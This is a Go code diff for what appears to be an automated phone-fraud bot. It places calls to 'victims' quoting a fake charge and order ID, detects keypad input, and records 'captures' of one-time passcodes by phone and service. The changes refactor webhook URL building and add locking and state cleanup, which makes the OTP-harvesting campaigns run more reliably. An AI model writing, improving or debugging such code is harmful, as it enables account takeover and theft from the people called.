@@ -57,24 +57,27 @@ func (b *Bot) processCall(job CallJob) {
 		return
 	}
 
+	// Generate dynamic template variables
 	victimName := "Customer"
 	amount := "$450.24"
 	orderID := "ORD-" + fmt.Sprintf("%d", time.Now().Unix())
 
-	greeting := b.replaceTemplateVars(template.Greeting, victimName, amount, orderID)
-	_ = greeting
-
-	actionURL := fmt.Sprintf("%s/detect_dtmf/%d/%d", cfg.NgrokURL, job.CampaignID, job.CallID)
-	ringURL := fmt.Sprintf("%s/ring/%d/%d", cfg.NgrokURL, job.CampaignID, job.CallID)
-	machineURL := fmt.Sprintf("%s/machine/%d/%d", cfg.NgrokURL, job.CampaignID, job.CallID)
+	// Replace template variables in greeting (stored for potential logging/debugging)
+	_ = b.replaceTemplateVars(template.Greeting, victimName, amount, orderID)
+	
+	// Build webhook URLs with proper trailing slash handling
+	answerURL := buildWebhookURL(cfg.NgrokURL, "answer", job.CampaignID, job.CallID)
+	ringURL := buildWebhookURL(cfg.NgrokURL, "ring", job.CampaignID, job.CallID)
+	machineURL := buildWebhookURL(cfg.NgrokURL, "machine", job.CampaignID, job.CallID)
+	errorURL := buildWebhookURL(cfg.NgrokURL, "error", job.CampaignID, job.CallID)
 
 	callReq := voice.CallRequest{
 		From:                cfg.PlivoNumber,
 		To:                  job.Phone,
-		AnswerURL:           actionURL,
+		AnswerURL:           answerURL,
 		RingURL:             ringURL,
 		MachineDetectionURL: machineURL,
-		ErrorCallbackURL:    fmt.Sprintf("%s/error/%d/%d", cfg.NgrokURL, job.CampaignID, job.CallID),
+		ErrorCallbackURL:    errorURL,
 		TimeLimit:           cfg.CallTimeout,
 		RingTimeout:         30,
 	}
@@ -199,15 +202,49 @@ func (b *Bot) checkCampaignComplete(campaignID int64) {
 	if campaign.Completed >= campaign.TotalCalls {
 		b.db.CompleteCampaign(campaignID)
 
+		b.mu.Lock()
 		if state, ok := b.campaignState[campaignID]; ok {
 			state.mu.Lock()
 			state.Status = "completed"
 			state.mu.Unlock()
 		}
+		// Clean up campaign state after completion
+		delete(b.campaignState, campaignID)
+		b.mu.Unlock()
 
 		b.db.CreateLog("INFO", fmt.Sprintf("Campaign %d completed: %d/%d calls, %d captures",
 			campaignID, campaign.Completed, campaign.TotalCalls, campaign.Captures), "")
 	}
+}
+
+// getCampaignState safely retrieves campaign state with proper locking
+func (b *Bot) getCampaignState(campaignID int64) (*CampaignState, bool) {
+	b.mu.RLock()
+	defer b.mu.RUnlock()
+	state, ok := b.campaignState[campaignID]
+	return state, ok
+}
+
+// setCampaignState safely sets campaign state with proper locking
+func (b *Bot) setCampaignState(campaignID int64, state *CampaignState) {
+	b.mu.Lock()
+	defer b.mu.Unlock()
+	b.campaignState[campaignID] = state
+}
+
+// incrementCampaignIndex safely increments the campaign index
+func (b *Bot) incrementCampaignIndex(campaignID int64) int {
+	b.mu.Lock()
+	defer b.mu.Unlock()
+	
+	if state, ok := b.campaignState[campaignID]; ok {
+		state.mu.Lock()
+		defer state.mu.Unlock()
+		idx := state.index
+		state.index++
+		return idx
+	}
+	return -1
 }
 
 func (b *Bot) notifyCapture(campaignID int64, phone, otp, service string) {
